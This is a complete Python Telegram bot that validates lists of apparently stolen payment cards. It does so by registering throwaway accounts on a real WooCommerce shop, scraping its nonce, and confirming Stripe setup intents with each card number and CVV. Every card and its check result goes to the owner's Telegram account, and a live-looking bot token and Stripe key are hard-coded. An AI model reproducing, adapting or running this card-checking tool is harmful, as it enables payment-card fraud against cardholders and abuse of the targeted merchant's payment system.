import telebot
import requests
import json

API_TOKEN = '7312219596:AAFkM0xEizkhp9OwKwydVbnOPo7vspEWigg'
OWNER_ID = '6036920176'  # Ensure this is correct
bot = telebot.TeleBot(API_TOKEN)

premium_users = ['5154912722', '935023786']

def is_premium(user_id):
    return str(user_id) in premium_users

def escape_markdown(text):
    escape_chars = r'_*[]()~`>#+-=|{}.!'
    return ''.join(['\\' + char if char in escape_chars else char for char in text])

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome! Please upload a .txt file with card details.")

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    user_id = message.from_user.id
    if not is_premium(user_id):
        bot.send_message(user_id, "Sorry, this service is available only for premium users.")
        return

    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    card_data = downloaded_file.decode('utf-8').splitlines()
    for line in card_data:
        cc, mes, ano, cvv = line.split('|')
        process_card(cc, mes, ano, cvv, user_id)

def process_card(cc, mes, ano, cvv, user_id):
    try:
        user_response = requests.get(
            "https://random-data-api.com/api/v2/users?size=1&is_xml=true",
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                "Pragma": "no-cache",
                "Accept": "*/*"
            }
        )
        user_data = user_response.json()
        first_name = user_data["first_name"]
        last_name = user_data["last_name"]
        email = f"{first_name}{last_name}@gmail.com"

        register_page_response = requests.get(
            "https://shopzone.nz/my-account/add-payment-method/",
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                "Pragma": "no-cache",
                "Accept": "*/*"
            }
        )
        regnon = register_page_response.text.split('id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="')[1].split('"')[0]

        requests.post(
            "https://shopzone.nz/my-account/add-payment-method/",
            data={
                "email": email,
                "woocommerce-register-nonce": regnon,
                "_wp_http_referer": "/my-account/add-payment-method/",
                "register": "Register"
            },
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                "Pragma": "no-cache",
                "Accept": "*/*"
            }
        )

        setup_intent_response = requests.post(
            "https://shopzone.nz/?wc-ajax=wc_stripe_frontend_request&path=/wc-stripe/v1/setup-intent",
            data={"payment_method": "stripe_cc"},
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                "Pragma": "no-cache",
                "Accept": "*/*"
            }
        )

        seti = setup_intent_response.text.split('{"client_secret":"')[1].split('"}')[0]
        secret = setup_intent_response.text.split('{"client_secret":"')[1].split('_secret_')[0]

        stripe_token_response = requests.post(
            "https://m.stripe.com/6",
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                "Pragma": "no-cache",
                "Accept": "*/*"
            }
        )
        stripe_token_data = stripe_token_response.json()
        muid = stripe_token_data["muid"]
        sid = stripe_token_data["sid"]
        guid = stripe_token_data["guid"]

        confirm_response = requests.post(
            f"https://api.stripe.com/v1/setup_intents/{secret}/confirm",
            data={
                "payment_method_data[type]": "card",
                "payment_method_data[card][number]": cc,
                "payment_method_data[card][cvc]": cvv,
                "payment_method_data[card][exp_month]": mes,
                "payment_method_data[card][exp_year]": ano,
                "payment_method_data[billing_details][address][postal_code]": "10080",
                "payment_method_data[guid]": guid,
                "payment_method_data[muid]": muid,
                "payment_method_data[sid]": sid,
                "payment_method_data[referrer]": "https://contabo.com",
                "expected_payment_method_type": "card",
                "use_stripe_sdk": "true",
                "key": "pk_live_51LPHnuAPNhSDWD7S7BcyuFczoPvly21Beb58T0NLyxZctbTMscpsqkAMCAUVd37qe4jAXCWSKCGqZOLO88lMAYBD00VBQbfSTm",
                "client_secret": seti
            },
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                "Pragma": "no-cache",
                "Accept": "*/*"
            }
        )
        response_json = confirm_response.json()

        if '"status": "succeeded"' in confirm_response.text:
            reason = "Payment Method Added Successfully"
            bot.send_message(OWNER_ID, f"🟢 *STRIPE AUTH APPROVED*\n\nCC: `{escape_markdown(cc)}|{escape_markdown(mes)}|{escape_markdown(ano)}|{escape_markdown(cvv)}`\n\nReason: {escape_markdown(reason)}\n\nCoded By @TechnoTinker_v2_", parse_mode='MarkdownV2')
        elif "stripe_3ds2_fingerprint" in confirm_response.text:
            reason = "3ds cc"
            bot.send_message(OWNER_ID, f"🟢 *STRIPE AUTH APPROVED*\n\nCC: `{escape_markdown(cc)}|{escape_markdown(mes)}|{escape_markdown(ano)}|{escape_markdown(cvv)}`\n\nReason: {escape_markdown(reason)}\n\nCoded By @TechnoTinker_v2_", parse_mode='MarkdownV2')
        elif "Your card's security code is incorrect." in confirm_response.text:
            reason = "CCN APPROVED"
            bot.send_message(OWNER_ID, f"🟢 *STRIPE AUTH APPROVED*\n\nCC: `{escape_markdown(cc)}|{escape_markdown(mes)}|{escape_markdown(ano)}|{escape_markdown(cvv)}`\n\nReason: {escape_markdown(reason)}\n\nCoded By @TechnoTinker_v2_", parse_mode='MarkdownV2')
        elif "Your card's security code is invalid" in confirm_response.text:
            reason = "CCN APPROVED"
            bot.send_message(OWNER_ID, f"🟢 *STRIPE AUTH APPROVED*\n\nCC: `{escape_markdown(cc)}|{escape_markdown(mes)}|{escape_markdown(ano)}|{escape_markdown(cvv)}`\n\nReason: {escape_markdown(reason)}\n\nCoded By @TechnoTinker_v2_", parse_mode='MarkdownV2')
        elif "Your card does not support this type of purchase." in confirm_response.text:
            reason = "Your card does not support this type of purchase"
            bot.send_message(OWNER_ID, f"🟢 *STRIPE AUTH APPROVED*\n\nCC: `{escape_markdown(cc)}|{escape_markdown(mes)}|{escape_markdown(ano)}|{escape_markdown(cvv)}`\n\nReason: {escape_markdown(reason)}\n\nCoded By @TechnoTinker_v2_", parse_mode='MarkdownV2')
        elif "Your card has insufficient funds." in confirm_response.text:
            reason = "Insufficient Funds"
            bot.send_message(OWNER_ID, f"🟢 *STRIPE AUTH APPROVED*\n\nCC: `{escape_markdown(cc)}|{escape_markdown(mes)}|{escape_markdown(ano)}|{escape_markdown(cvv)}`\n\nReason: {escape_markdown(reason)}\n\nCoded By @TechnoTinker_v2_", parse_mode='MarkdownV2')
        else:
            code = response_json.get("error", {}).get("code")
            decline_code = response_json.get("error", {}).get("decline_code")
            message = response_json.get("error", {}).get("message")
            reason = f"Declined {code}|{decline_code}|{message}"
            bot.send_message(OWNER_ID, f"🔴 *STRIPE AUTH DECLINE*\n\nCC: `{escape_markdown(cc)}|{escape_markdown(mes)}|{escape_markdown(ano)}|{escape_markdown(cvv)}`\n\nReason: {escape_markdown(reason)}\n\nCoded By @TechnoTinker_v2_", parse_mode='MarkdownV2')

    except Exception as e:
        bot.send_message(OWNER_ID, f"🔴 *Failed to retrieve user data for card `{escape_markdown(cc)}|{escape_markdown(mes)}|{escape_markdown(ano)}|{escape_markdown(cvv)}`*\n\nError: {escape_markdown(str(e))}\n\nCoded By @TechnoTinker_v2_", parse_mode='MarkdownV2')

async def get_bin_info(bin_number):
    try:
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}")
        data = response.json()
        bin_info = (
            f"🌍 *𝗖𝗼𝘂𝗻𝘁𝗿𝘆:* {escape_markdown(data.get('country_name', 'N/A'))} {escape_markdown(data.get('country_flag', 'N/A'))}\n"
        )
        return bin_info
    except Exception as e:
        return str(e)

bot.polling()
